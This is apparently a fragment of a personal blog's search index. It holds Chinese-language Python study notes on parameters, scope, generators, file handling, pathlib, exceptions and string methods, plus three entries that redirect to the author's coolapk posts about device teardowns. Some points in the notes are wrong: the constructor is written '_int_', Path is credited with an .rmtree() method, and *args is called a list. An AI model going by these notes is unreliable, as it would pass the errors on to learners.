MyFirstFunction(name):</li><li>函数定义过程中的 name 是形参 表示占据一个参数位置</li><li>MyFirstFunction(传递进来的name) 此name为实参 </li><li>关键字参数 ‘ <ul><li>例如 def function(name,words):</li><li>​               print(name + words)</li><li>​        function(name&#x3D;’a’,words&#x3D;’b’)</li></ul></li><li>默认参数  在参数中给定默认值，则在未给实参时输出默认值<ul><li>function（）</li></ul></li><li>收集参数<ul><li>一个*号代表列表 两个代表字典</li></ul></li></ul><h3 id="局部变量与全局变量"><a href="#局部变量与全局变量" class="headerlink" title="局部变量与全局变量"></a>局部变量与全局变量</h3><ul><li>global 在函数内部访问和修改全局作用域中的变量</li><li>nonlocal 用于在嵌套函数中访问和修改外部函数作用域中的变量</li><li><code>nonlocal</code>不能修改全局作用域中的变量，而<code>global</code>不能修改嵌套函数外部作用域中的变量</li><li>L E G B 优先级从高到低</li><li>局部作用域 - 嵌套函数的局部作用域 - 全局作用域 - 内置作用域</li></ul><h3 id="内嵌函数和闭包"><a href="#内嵌函数和闭包" class="headerlink" title="内嵌函数和闭包"></a>内嵌函数和闭包</h3><ul><li><img src="D:\zhuomian\PICTURE\微信图片_20230802133932.png"></li></ul><h3 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h3><ul><li>允许你在不修改函数本身的情况下，通过添加额外的功能来增强函数或类的功能。</li><li>装饰器本质上是语法糖</li></ul><h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h3><ul><li>生成器是一种特殊的迭代器。他可以逐个产生值，而非一次性全部产生。</li><li>my_generator &#x3D; (x * 2 for x in range(5))  生成器表达式 </li><li>可使用 next（） 或者在 循环中使用该生成器</li></ul><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><ul><li>打开文件<ul><li>file &#x3D; open(‘文件路径’,’打开模式’)</li></ul></li><li>r为只读模式 w为覆写模式 a为追加模式</li><li>wb是文件写入模式的一种，代表write binary 以二进制写入方式打开文件（w）代表写入</li><li>阅读文件<ul><li>使用read（）</li><li>例如 count &#x3D; file.read（）</li><li>print（count）</li></ul></li><li>写入文件<ul><li>file.write（）</li></ul></li><li>关闭文件<ul><li>file.close（）</li></ul></li></ul><h3 id="path模块"><a href="#path模块" class="headerlink" title="path模块"></a>path模块</h3><ul><li>调用<ul><li>from pathlib import Path</li></ul></li><li>使用字符串创建路径对象</li><li>path &#x3D; Path(‘’path&#x2F;to&#x2F;file.txt’’)</li><li>获取文件名和父目录<ul><li>path.name     file.txt</li><li>path.parent      path&#x2F;to</li></ul></li><li>获取绝对路径<ul><li>path.resolve()</li></ul></li><li>判断路径或者文件是否存在<ul><li>path.exists()</li></ul></li><li>判断是否是文件或者目录<ul><li>path.is_file()   path.is_dir()</li></ul></li><li>创建目录：可以使用 <code>.mkdir()</code> 方法创建目录</li><li>列出目录内容：使用 <code>.iterdir()</code> 方法可以列出目录下的所有内容（包括文件和子目录）</li><li>删除文件或目录：可以使用 <code>.unlink()</code> 方法删除文件，使用 <code>.rmdir()</code> 方法删除空目录，使用 <code>.rmtree()</code> 方法删除非空目录。</li></ul><h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><h3 id="异常捕捉"><a href="#异常捕捉" class="headerlink" title="异常捕捉"></a>异常捕捉</h3><ul><li>try <ul><li>执行代码</li></ul></li><li>except<ul><li>发生异常时会执行的代码</li><li>一个except子句可以同时处理多个异常，这些异常将被放在一个括号里成为一个元组</li><li>一个 try 语句可能包含多个except子句，分别来处理不同的特定的异常。最多只有一个分支会被执行。</li></ul></li><li>else<ul><li>没有异常时执行的代码</li></ul></li><li>finally<ul><li>不管有没有异常都会执行的代码</li></ul></li></ul><h3 id="抛出异常"><a href="#抛出异常" class="headerlink" title="抛出异常"></a>抛出异常</h3><ul><li>raise [Exception [, args [, traceback]]]</li></ul><h2 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h2><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><ul><li>构造函数<ul><li>为对象设置初始化状态，给对象的属性赋初值，可以接受参数。</li><li>创建对象的时候，构造函数会自动被调用。</li><li>def _ <em>int</em> _(self,name,age)</li></ul></li><li>super()函数<ul><li>用于调用父类的方法</li><li>通常在子类的构造函数中使用</li><li>能够自动帮你找出所有基类以及对应的方法</li></ul></li></ul><h2 id="有关进制"><a href="#有关进制" class="headerlink" title="有关进制"></a>有关进制</h2><ul><li>int（数字，几进制） 可转换为十进制</li><li>ord（） 返回对应的ASCII码值 用十进制表示</li><li>chr（） 返回某个十进制数对应的ASCII 码 字符</li></ul><h2 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h2><ul><li>a.replace(‘想替换的字符’,’替换成的字符’)</li><li>‘分隔符’<code>join()</code> 方法用于将一个可迭代对象（如列表、元组、字符串等）中的元素连接成一个字符串。<ul><li>separator.join(iterable)</li><li>要插入的分隔符    要连接的可迭代对象</li></ul></li><li>str.maketrans(x[, y[, z]])<ul><li>用于创建字符映射转换表</li><li>x为要替换的字符 y为替换成的字符 z为要删除的字符</li></ul></li><li>str.translate(table)<ul><li>table是一个映射表 根据makertrans创建</li></ul></li><li>strip（） 去掉头尾空格</li><li>lower（） 转换为全小写</li><li>isupper(): 判断字符串中的所有字母是否都是大写字母</li><li>islower()&#96;: 判断字符串中的所有字母是否都是小写字母</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>K20pro改造分享</title>
    <link href="/2021/08/31/K20pro%E6%94%B9%E9%80%A0%E5%88%86%E4%BA%AB/"/>
    <url>/2021/08/31/K20pro%E6%94%B9%E9%80%A0%E5%88%86%E4%BA%AB/</url>
    
    <content type="html"><![CDATA[<meta http-equiv="refresh" content="0; url=https://www.coolapk.com/feed/29641743?s=YzdkNTIyYzhhN2YxOTVnNjhhOWVhNTl6i1552">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>一部酷派上古机子的简单拆解</title>
    <link href="/2021/08/29/%E4%B8%80%E9%83%A8%E9%85%B7%E6%B4%BE%E4%B8%8A%E5%8F%A4%E6%9C%BA%E5%AD%90%E7%9A%84%E7%AE%80%E5%8D%95%E6%8B%86%E8%A7%A3/"/>
    <url>/2021/08/29/%E4%B8%80%E9%83%A8%E9%85%B7%E6%B4%BE%E4%B8%8A%E5%8F%A4%E6%9C%BA%E5%AD%90%E7%9A%84%E7%AE%80%E5%8D%95%E6%8B%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<meta http-equiv="refresh" content="0; url=https://www.coolapk.com/feed/29593982?s=NzI0M2UxYWZhN2YxOTVnNjhhOWVhNDd6i1552">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记本清灰换硅脂分享</title>
    <link href="/2021/08/22/%E7%AC%94%E8%AE%B0%E6%9C%AC%E6%B8%85%E7%81%B0%E6%8D%A2%E7%A1%85%E8%84%82%E5%88%86%E4%BA%AB/"/>
    <url>/2021/08/22/%E7%AC%94%E8%AE%B0%E6%9C%AC%E6%B8%85%E7%81%B0%E6%8D%A2%E7%A1%85%E8%84%82%E5%88%86%E4%BA%AB/</url>
    
    <content type="html"><![CDATA[  <meta http-equiv="refresh" content="0; url=https://www.coolapk.com/feed/29417186?s=YjliMDk1ODRhN2YxOTVnNjhhOWViNmR6i1552">]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
